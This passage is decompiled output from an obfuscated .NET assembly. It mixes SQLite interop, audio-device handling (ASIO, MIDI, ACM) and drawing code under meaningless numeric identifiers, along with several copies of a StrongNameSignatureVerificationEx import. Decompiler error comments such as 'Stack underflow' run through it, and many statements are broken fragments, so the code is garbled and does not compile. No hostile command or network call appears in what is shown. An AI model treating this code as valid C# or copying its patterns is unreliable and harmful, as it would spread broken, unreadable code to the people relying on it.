				if ((int)/*Error near IL_000f: Stack underflow*/ != 0 && !_0012_0004._007E_001A_0008(_0002, global::_0017._0084._0002, StringComparison.OrdinalIgnoreCase))
				{
					return global::_000F._008B_0002(_0002, global::_0017._0084._0002);
				}
			}
			return _0002;
		}

		[DllImport("winmm.dll", EntryPoint = "midiStreamClose")]
		static extern MmResult _0001(IntPtr _0002);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		unsafe static bool _0001(int _0002, global::_0017._0005 _0003, _001E._0004 _0004, _001B._0004 P_3)
		{
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 2
			//IL_0041: Incompatible stack heights: 0 vs 2
			_ = ((_001E._0004)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = ref P_3;
			switch (((global::_0013._0005)/*Error near IL_0012: Stack underflow*/)._0001((int)/*Error near IL_0012: Stack underflow*/, ref *(_001B._0004*)/*Error near IL_0012: Stack underflow*/, (global::_0017._0005)/*Error near IL_0012: Stack underflow*/))
			{
			case -2147220991:
				throw new ArgumentException(_0080._0014._0001(107354766));
			default:
				_ = -2147220987;
				return false;
			case 0:
				return true;
			}
		}

		static void _0001(_001E._0013 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((_001E._0013)/*Error near IL_0007: Stack underflow*/)._0002)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(_001E._0013).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static global::_0010._0019 _0001(_001F._0015 _0002, global::_0016._0019 _0003, _0019._0016 P_2)
		{
			//IL_0029: Incompatible stack heights: 0 vs 2
			//IL_002c: Incompatible stack heights: 0 vs 2
			global::_0018._0018 obj = null;
			_ = global::_0007._0097;
			_ = ((_001F._0015)/*Error near IL_000f: Stack underflow*/)._0001;
			int num = ((global::_0006._0015)/*Error near IL_0019: Stack underflow*/)._0001((global::_0016._0019)/*Error near IL_0019: Stack underflow*/, P_2, out obj);
			/*Error near IL_001e: Stack underflow*/(num);
			return new global::_0010._0019(obj);
		}

		static void _0001(global::_0015._0004 _0002, Graphics P_1)
		{
			//IL_001e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0024: Expected O, but got Unknown
			//IL_010d: Incompatible stack heights: 0 vs 1
			//IL_0112: Unknown result type (might be due to invalid IL or missing references)
			//IL_0117: Incompatible stack heights: 0 vs 1
			_0001_0002._0097_0004();
			new SolidBrush((Color)/*Error near IL_0117: Stack underflow*/);
			Brush val = (Brush)/*Error near IL_011d: Stack underflow*/;
			Pen val2 = new Pen(_0001_0002._0096_0004());
			_0002._0001.X = (global::_001A._0012_0003(_0002) - _0002._0004) / 2;
			_0002._0001.Width = _0002._0004;
			_0002._0001.Y = (int)((float)(global::_001A._0013_0003(_0002) - _0002._0003) * _0002._0001);
			_0002._0001.Height = _0002._0003;
			_0003_0006._007E_0096_000F(P_1, val, _0002._0001);
			_000F_0002._007E_000F_0005(P_1, val2, _0002._0001.Left, _0002._0001.Top + _0002._0001.Height / 2, _0002._0001.Right, _0002._0001.Top + _0002._0001.Height / 2);
			global::_0008._007E_009C(val);
			global::_0008._007E_0019_0002(val2);
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_table_column_metadata_interop")]
		static extern _0080._0017 _0001(IntPtr _0002, byte[] _0003, byte[] _0004, byte[] _0005, ref IntPtr _0006, ref IntPtr _0007, ref int _0008, ref int _000E, ref int _000F, ref int _0010, ref int _0011);

		static void _0001(_001F._0019._0003 _0002, long P_1)
		{
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 2
			((_001F._0019._0003)/*Error near IL_0052: Stack underflow*/).IsValid = false;
			_ = _0004_0006._007E_0097_000F;
			_0016 obj = ((_001F._0019._0003)/*Error near IL_0011: Stack underflow*/)._0001.Parameters[0];
			object obj2 = P_1;
			/*Error near IL_0027: Stack underflow*/(obj, obj2);
			_0002._0001 = _0018._0001(_0002._0001);
			global::_001B._007E_008F_0003(_0002._0001);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_value_blob")]
		static extern IntPtr _0001(IntPtr _0002);

		static void _0001(global::_0015._0018 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0015._0018)/*Error near IL_0007: Stack underflow*/)._0002)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0015._0018).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static float[] _0001(global::_000E._001A P_0)
		{
			//IL_0033: Incompatible stack heights: 0 vs 2
			//IL_003a: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			((global::_000E._001A)/*Error near IL_000c: Stack underflow*/)._0001._0001(out var num);
			/*Error near IL_0041: Stack underflow*/((int)/*Error near IL_0041: Stack underflow*/);
			float[] array = new float[num];
			global::_0007._0097(P_0._0001._0002(num, array));
			return array;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static _001A._0018[] _0001(int _0002, IntPtr _0003)
		{
			//IL_0003: Invalid comparison between Unknown and I4
			//IL_0066: Incompatible stack heights: 0 vs 1
			//IL_006c: Incompatible stack heights: 0 vs 2
			//IL_0073: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0005: Stack underflow*/ < 0)
			{
				return null;
			}
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0073: Stack underflow*/((IntPtr)/*Error near IL_0073: Stack underflow*/, zero);
			if ((int)/*Error near IL_0017: Stack underflow*/ != 0)
			{
				return null;
			}
			_001A._0018[] array = new _001A._0018[_0002];
			int num = 0;
			int num2 = 0;
			while (num < array.Length)
			{
				IntPtr intPtr = _0018._0001(_0003, num2);
				array[num] = (_0090_0002._0099_0005(intPtr, IntPtr.Zero) ? new _001A._0018(intPtr) : null);
				num++;
				num2 += _001B_0003._0097_0006();
			}
			return array;
		}

		static string[] _0001(IntPtr _0002, int _0003)
		{
			//IL_0003: Invalid comparison between Unknown and I4
			//IL_0066: Incompatible stack heights: 0 vs 1
			//IL_006c: Incompatible stack heights: 0 vs 2
			//IL_0073: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0005: Stack underflow*/ < 0)
			{
				return null;
			}
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0073: Stack underflow*/((IntPtr)/*Error near IL_0073: Stack underflow*/, zero);
			if ((int)/*Error near IL_0017: Stack underflow*/ != 0)
			{
				return null;
			}
			string[] array = new string[_0003];
			int num = 0;
			int num2 = 0;
			while (num < array.Length)
			{
				IntPtr intPtr = _0018._0001(_0002, num2);
				array[num] = (_0090_0002._0099_0005(intPtr, IntPtr.Zero) ? _0018._0001(intPtr) : null);
				num++;
				num2 += _001B_0003._0097_0006();
			}
			return array;
		}

		static float _0001(_001D._0014 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_001D._0014)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		static void _0001(bool _0002, global::_0007._0007 P_1)
		{
			//IL_00b8: Incompatible stack heights: 0 vs 1
			//IL_00be: Incompatible stack heights: 0 vs 1
			//IL_00c8: Incompatible stack heights: 0 vs 1
			_ = ((global::_0007._0007)/*Error near IL_0010: Stack underflow*/)._0002.IsAllocated;
			if ((int)/*Error near IL_0017: Stack underflow*/ != 0)
			{
				P_1._0002.Free();
			}
			if (P_1._0001.IsAllocated)
			{
				P_1._0001.Free();
			}
			if (P_1._0003.IsAllocated)
			{
				P_1._0003.Free();
			}
			if (_0090_0002._0099_0005(P_1._0001, IntPtr.Zero))
			{
				object obj = P_1._0001;
				_0091_0002._009C_0005(obj);
				try
				{
					_0018._0001(P_1._0001, P_1._0001, _0098._0089_0004(P_1._0001));
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
				P_1._0001 = IntPtr.Zero;
			}
		}

		unsafe static void _0001(IntPtr _0002, IntPtr[] _0003, int _0004, int _0005)
		{
			//IL_006f: Incompatible stack heights: 0 vs 2
			//IL_0079: Incompatible stack heights: 0 vs 1
			_ = _0010_0005._0096_000E;
			/*Error near IL_0079: Stack underflow*/((IntPtr)/*Error near IL_0079: Stack underflow*/);
			float* ptr = (float*)/*Error near IL_007f: Stack underflow*/;
			int*[] array = new int*[_0004];
			for (int i = 0; i < _0004; i++)
			{
				array[i] = (int*)_0010_0005._0096_000E(_0003[i]);
			}
			for (int j = 0; j < _0005; j++)
			{
				for (int k = 0; k < _0004; k++)
				{
					ref int* reference = ref array[k];
					int* ptr2 = reference;
					reference = ptr2 + 1;
					float* num = ptr;
					ptr = num + 1;
					*ptr2 = _0018._0001((double)(*num));
				}
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, EntryPoint = "sqlite3_bind_text16")]
		static extern _0080._0017 _0001(IntPtr _0002, int _0003, string _0004, int _0005, IntPtr _0006);

		static string _0001(string _0002, global::_0016._0001 P_1)
		{
			//IL_0071: Incompatible stack heights: 0 vs 2
			//IL_0085: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107396634);
			string text = default(string);
			if (0 == 0)
			{
				text = (string)/*Error near IL_008b: Stack underflow*/;
			}
			try
			{
				_ = global::_001C._0095_0003;
				if (/*Error near IL_001c: Stack underflow*/((string)/*Error near IL_001c: Stack underflow*/))
				{
					string[] array = _0095._0086_0004(_0002);
					string[] array2 = array;
					foreach (string text2 in array2)
					{
						text = global::_0011._008E_0002(text, text2, global::_0002._007E_0006(_0080._0014._0001(107396940)));
					}
				}
			}
			catch
			{
			}
			return text;
		}

		static DbType _0001(SQLiteConnectionFlags _0002, global::_0017._0080 _0003, string _0004)
		{
			//IL_0021: Unknown result type (might be due to invalid IL or missing references)
			//IL_0024: Expected I8, but got Unknown
			//IL_01a7: Incompatible stack heights: 0 vs 1
			//IL_01ad: Incompatible stack heights: 0 vs 1
			//IL_01b3: Incompatible stack heights: 0 vs 1
			DbType? dbType = null;
			if ((int)/*Error near IL_0012: Stack underflow*/ != 0)
			{
				SQLiteConnectionFlags num = ((global::_0017._0080)/*Error near IL_0021: Stack underflow*/).Flags;
				_0002 = (SQLiteConnectionFlags)(/*Error near IL_0022: Stack underflow*/ | num);
				if ((_0002 & SQLiteConnectionFlags.UseConnectionTypes) == SQLiteConnectionFlags.UseConnectionTypes)
				{
					global::_0001._001D obj = _0003._0001;
					if (obj != null && _0004 != null)
					{
						if (obj.TryGetValue(_0004, out var value))
						{
							return value._0001;
						}
						int num2 = _0086_0002._007E_008E_0005(_0004, '(');
						if (num2 > 0 && obj.TryGetValue(_0005_0006._007E_0098_000F(_0087_0002._007E_008F_0005(_0004, 0, num2), new char[0]), out value))
						{
							return value._0001;
						}
					}
				}
				dbType = _0003.DefaultDbType;
			}
			if ((_0002 & SQLiteConnectionFlags.NoGlobalTypes) == SQLiteConnectionFlags.NoGlobalTypes)
			{
				if (dbType.HasValue)
				{
					return dbType.Value;
				}
				dbType = _0018._0001(_0003);
				_0018._0001(dbType, _0004, _0002);
				return dbType.Value;
			}
			object obj2;
			_0091_0002._009C_0005(obj2 = global::_0001._001A._0001);
			try
			{
				if (global::_0001._001A._0001 == null)
				{
					global::_0001._001A._0001 = _0018._0001();
				}
				if (_0004 != null)
				{
					if (global::_0001._001A._0001.TryGetValue(_0004, out var value2))
					{
						return value2._0001;
					}
					int num3 = _0086_0002._007E_008E_0005(_0004, '(');
					if (num3 > 0 && global::_0001._001A._0001.TryGetValue(_0005_0006._007E_0098_000F(_0087_0002._007E_008F_0005(_0004, 0, num3), new char[0]), out value2))
					{
						return value2._0001;
					}
				}
			}
			finally
			{
				_0091_0002._009D_0005(obj2);
			}
			if (dbType.HasValue)
			{
				return dbType.Value;
			}
			dbType = _0018._0001(_0003);
			_0018._0001(dbType, _0004, _0002);
			return dbType.Value;
		}

		static void _0001(global::_0010._001C P_0)
		{
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0010._001C)/*Error near IL_0020: Stack underflow*/);
			_0018._0001((global::_0010._001C)/*Error near IL_000b: Stack underflow*/);
			P_0._0001._0001 = true;
		}

		static void _0001(global::_000E._001F _0002, IntPtr _0003)
		{
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0050: Incompatible stack heights: 0 vs 2
			//IL_0057: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return;
			}
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0057: Stack underflow*/((IntPtr)/*Error near IL_0057: Stack underflow*/, zero);
			if ((int)/*Error near IL_0014: Stack underflow*/ != 0)
			{
				return;
			}
			try
			{
			}
			finally
			{
				global::_000E._001F obj;
				_0091_0002._009C_0005(obj = _0002);
				try
				{
					_0080._0017 obj2 = _0018._0001(_0003);
					if (obj2 != 0)
					{
						throw new SQLiteException(obj2, _0018._0001(_0002, _0003));
					}
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		static void _0001(out int _0002, [Out] global::_0017._0015 _0003, ref int P_2)
		{
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._0015)/*Error near IL_0009: Stack underflow*/)._0001._0001;
			IntPtr pUnknown = ((global::_0017._0015)/*Error near IL_0015: Stack underflow*/)._0001;
			AsioError num = /*Error near IL_001c: Stack underflow*/(pUnknown, out P_2, out _0002);
			string text = _0080._0014._0001(107354769);
			_0018._0001((global::_0017._0015)/*Error near IL_002b: Stack underflow*/, num, text);
		}

		static int _0001(bool _0002, global::_0017._0080 _0003, DbType _0004, string P_3)
		{
			//IL_008e: Incompatible stack heights: 0 vs 1
			//IL_009e: Incompatible stack heights: 0 vs 1
			if (0 == 0)
			{
				_0018._0001((global::_0017._0080)/*Error near IL_0098: Stack underflow*/);
			}
			if ((int)/*Error near IL_0013: Stack underflow*/ == 0)
			{
				throw new ArgumentNullException(_0080._0014._0001(107357796));
			}
			int num = -1;
			if (_0003._0001 != null)
			{
				num = 0;
				if (_0002 && _0018._0001(_0004, _0003._0001))
				{
					num += (_0018._0001(_0004, _0003._0001) ? 1 : 0);
				}
				if (_0003._0001.ContainsKey(P_3))
				{
					num += (_0003._0001.Remove(P_3) ? 1 : 0);
				}
				_0003._0001._0001(new global::_0006._0018(P_3, _0004, _0002));
			}
			return num;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_bind_parameter_count")]
		static extern int _0001(IntPtr _0002);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static _0019._0012 _0001()
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			_0018._0001(out _0019._0012 _);
			return (_0019._0012)/*Error near IL_0007: Stack underflow*/;
		}

		static string _0001(string _0002)
		{
			//IL_005b: Incompatible stack heights: 0 vs 1
			//IL_0062: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				_0018._0001();
				if (0 == 0)
				{
					_0002 = (string)/*Error near IL_0066: Stack underflow*/;
				}
			}
			if (global::_001C._0096_0003(_0002))
			{
				return null;
			}
			object obj;
			_0091_0002._009C_0005(obj = global::_0017._0084._0001);
			try
			{
				if (global::_0017._0084._0001 == null)
				{
					return null;
				}
				if (global::_0017._0084._0001.TryGetValue(_0002, out var value))
				{
					return value;
				}
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
			return null;
		}

		static void _0001(int _0002, global::_0015._0012 P_1)
		{
			//IL_0017: Incompatible stack heights: 0 vs 2
			//IL_001a: Incompatible stack heights: 0 vs 2
			//IL_0021: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			_ = ((global::_0015._0012)/*Error near IL_000c: Stack underflow*/)._0001;
			((global::_0012._0010)/*Error near IL_0021: Stack underflow*/)._0001((int)/*Error near IL_0021: Stack underflow*/);
			/*Error near IL_0015: Stack underflow*/((int)/*Error near IL_0015: Stack underflow*/);
		}

		static global::_0014._000E._0001 _0001(global::_0005._0005 _0002, AsioSampleType _0003)
		{
			//IL_0197: Incompatible stack heights: 0 vs 1
			global::_0014._000E._0001 result = null;
			bool flag = ((global::_0005._0005)/*Error near IL_0010: Stack underflow*/)._0001 == 2;
			switch (_0003)
			{
			case AsioSampleType.Int32LSB:
				switch (_0002._0003)
				{
				case 16:
					result = (flag ? new global::_0014._000E._0001(_0018._0001) : new global::_0014._000E._0001(_0018._0001));
					break;
				case 32:
					result = (flag ? new global::_0014._000E._0001(_0018._0001) : new global::_0014._000E._0001(_0018._0001));
					break;
				}
				break;
			case AsioSampleType.Int16LSB:
				switch (_0002._0003)
				{
				case 16:
					result = (flag ? new global::_0014._000E._0001(_0018._0001) : new global::_0014._000E._0001(_0018._0001));
					break;
				case 32:
					result = (flag ? new global::_0014._000E._0001(_0018._0001) : new global::_0014._000E._0001(_0018._0001));
					break;
				}
				break;
			case AsioSampleType.Int24LSB:
				switch (_0002._0003)
				{
				case 16:
					throw new ArgumentException(_0080._0014._0001(107354720));
				case 32:
					result = _0018._0001;
					break;
				}
				break;
			case AsioSampleType.Float32LSB:
				switch (_0002._0003)
				{
				case 16:
					throw new ArgumentException(_0080._0014._0001(107354720));
				case 32:
					result = _0018._0001;
					break;
				}
				break;
			default:
				throw new ArgumentException(_0008_0002._0007_0005(_0080._0014._0001(107354715), _0006_0006._0099_000F(_0091._0080_0004(typeof(AsioSampleType).TypeHandle), _0003)));
			}
			return result;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static int _0001(_001A._0018 P_0)
		{
			//IL_0025: Incompatible stack heights: 0 vs 2
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((_001A._0018)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_002c: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				return 0;
			}
			return _0018._0001(((_001A._0018)/*Error near IL_001e: Stack underflow*/)._0001);
		}

		static string[] _0001()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			_0018._0001();
			return (string[])/*Error near IL_0003: Stack underflow*/;
		}

		static void _0001(IntPtr _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			_0018._0001((IntPtr)/*Error near IL_000d: Stack underflow*/);
		}

		static DateTime _0001(double _0002, global::_0001._001A P_1)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			_0018._0001(_0003: ((global::_0001._001A)/*Error near IL_0009: Stack underflow*/)._0001, _0002: (double)/*Error near IL_0017: Stack underflow*/);
			return (DateTime)/*Error near IL_000c: Stack underflow*/;
		}

		static void _0001(int _0002, _001D._0006 _0003, int P_2)
		{
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 2
			_ = 16;
			global::_0005._0005 obj = new global::_0005._0005((int)/*Error near IL_000d: Stack underflow*/, (int)/*Error near IL_000d: Stack underflow*/, (int)/*Error near IL_000d: Stack underflow*/);
			((_001D._0006)/*Error near IL_0012: Stack underflow*/)._0001 = obj;
		}

		static IEnumerable<global::_0014._0002> _0001(Guid _0002)
		{
			//IL_0011: Incompatible stack heights: 0 vs 3
			new global::_0005._0002._0001(-2);
			((global::_0005._0002._0001)/*Error near IL_000f: Stack underflow*/)._0002 = (Guid)/*Error near IL_000f: Stack underflow*/;
			return (IEnumerable<global::_0014._0002>)/*Error near IL_0010: Stack underflow*/;
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_finalize_interop")]
		static extern _0080._0017 _0001(IntPtr _0002);

		static int _0001(string _0002)
		{
			//IL_000a: Invalid comparison between Unknown and I4
			//IL_004c: Incompatible stack heights: 0 vs 2
			//IL_0053: Incompatible stack heights: 0 vs 1
			//IL_005a: Incompatible stack heights: 0 vs 1
			_ = global::_001A._007E_0016_0003;
			/*Error near IL_0053: Stack underflow*/((object)/*Error near IL_0053: Stack underflow*/);
			if ((int)/*Error near IL_000c: Stack underflow*/ != 4)
			{
				_0080._0014._0001(107354626);
				throw new ArgumentException((string?)/*Error near IL_0018: Stack underflow*/);
			}
			byte[] array = _0087_0003._007E_0081_0007(_0082_0002._0088_0005(), _0002);
			if (array.Length != 4)
			{
				throw new ArgumentException(_0080._0014._0001(107355125));
			}
			return BitConverter.ToInt32(array, 0);
		}

		static global::_0017._007F._0004 _0001(global::_0017._007F._0005 P_0)
		{
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			byte[] array = new byte[((global::_0017._007F._0005)/*Error near IL_0007: Stack underflow*/)._0008];
			Array.Copy(((global::_0017._007F._0005)/*Error near IL_0015: Stack underflow*/)._0002, 0, array, 0, P_0._0008);
			return new global::_0017._007F._0004(array);
		}

		static void _0001(global::_0007._0002 P_0)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_0012: Incompatible stack heights: 0 vs 1
			new Container();
			((global::_0007._0002)/*Error near IL_0009: Stack underflow*/)._0001 = (Container)/*Error near IL_0009: Stack underflow*/;
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_column_table_name_interop")]
		static extern IntPtr _0001(IntPtr _0002, int _0003, ref int _0004);

		unsafe static bool _0001(ref string _0002, IntPtr _0003, string _0004, ref global::_0005._0005 _0005, [Out] global::_0005._0005 _0006, [Out] _001E._000F _0007, out string _0008)
		{
			//IL_0136: Incompatible stack heights: 0 vs 3
			//IL_0140: Incompatible stack heights: 0 vs 1
			//IL_0146: Incompatible stack heights: 0 vs 2
			_000E obj = default(_000E);
			_ = ref obj;
			_ = _0098._0089_0004;
			object obj2 = (_000E)/*Error near IL_0019: Stack underflow*/;
			/*Error near IL_0140: Stack underflow*/(obj2);
			((_000E*)(nint)/*Error near IL_0023: Stack underflow*/)->_0001 = (int)/*Error near IL_0023: Stack underflow*/;
			obj._0001 = global::_000E._0011._0001;
			_ = ref obj;
			((_000E*)(nint)/*Error near IL_0037: Stack underflow*/)->_0001 = (IntPtr)/*Error near IL_0037: Stack underflow*/;
			int num = 200;
			obj._0002 = _0099._008C_0004(num);
			obj._0002 = num;
			obj._0001 = _0004;
			obj._0004 = null;
			obj._0001 = _0007;
			obj._0003 = IntPtr.Zero;
			if (_0006 != null)
			{
				IntPtr intPtr = _0099._008C_0004(_0098._0089_0004(_0006));
				_009A._008F_0004(_0006, intPtr, false);
				obj._0003 = intPtr;
			}
			obj._0004 = IntPtr.Zero;
			obj._0005 = null;
			MmResult mmResult = _0018._0001(ref obj);
			_0005 = null;
			_0008 = null;
			_0002 = null;
			if (mmResult == MmResult.NoError)
			{
				_0005 = _0018._0001(obj._0002);
				_0008 = obj._0003;
				_0002 = obj._0002;
			}
			_009B._0090_0004(obj._0003);
			_009B._0090_0004(obj._0002);
			if (mmResult != MmResult.AcmCancelled && mmResult != 0)
			{
				throw new global::_0013._0001(mmResult, _0080._0014._0001(107355048));
			}
			return mmResult == MmResult.NoError;
		}

		static DataTable _0001(global::_0017._0080 P_0)
		{
			//IL_0418: Incompatible stack heights: 0 vs 1
			//IL_0422: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107355059);
			new DataTable((string?)/*Error near IL_0422: Stack underflow*/);
			DataTable dataTable = (DataTable)/*Error near IL_0428: Stack underflow*/;
			_0001_0005._007E_008A_000E(dataTable, _008F_0003._008B_0007());
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), DbMetaDataColumnNames.CompositeIdentifierSeparatorPattern, _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), DbMetaDataColumnNames.DataSourceProductName, _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), DbMetaDataColumnNames.DataSourceProductVersion, _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), DbMetaDataColumnNames.DataSourceProductVersionNormalized, _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), DbMetaDataColumnNames.GroupByBehavior, _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), DbMetaDataColumnNames.IdentifierPattern, _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), DbMetaDataColumnNames.IdentifierCase, _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), DbMetaDataColumnNames.OrderByColumnsInSelect, _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), DbMetaDataColumnNames.ParameterMarkerFormat, _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), DbMetaDataColumnNames.ParameterMarkerPattern, _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), DbMetaDataColumnNames.ParameterNameMaxLength, _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), DbMetaDataColumnNames.ParameterNamePattern, _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), DbMetaDataColumnNames.QuotedIdentifierPattern, _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), DbMetaDataColumnNames.QuotedIdentifierCase, _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), DbMetaDataColumnNames.StatementSeparatorPattern, _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), DbMetaDataColumnNames.StringLiteralPattern, _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), DbMetaDataColumnNames.SupportedJoinOperators, _0091._0080_0004(typeof(int).TypeHandle));
			global::_0008._007E_0011_0002(dataTable);
			DataRow dataRow = _0005_0005._007E_008E_000E(dataTable);
			_0007_0006._007E_009A_000F(dataRow, new object[17]
			{
				null,
				_0080._0014._0001(107355030),
				P_0._0001.Version,
				P_0._0001.Version,
				3,
				_0080._0014._0001(107354989),
				1,
				false,
				_0080._0014._0001(107354367),
				_0080._0014._0001(107354362),
				255,
				_0080._0014._0001(107354217),
				_0080._0014._0001(107354136),
				1,
				_0080._0014._0001(107354595),
				_0080._0014._0001(107354622),
				15
			});
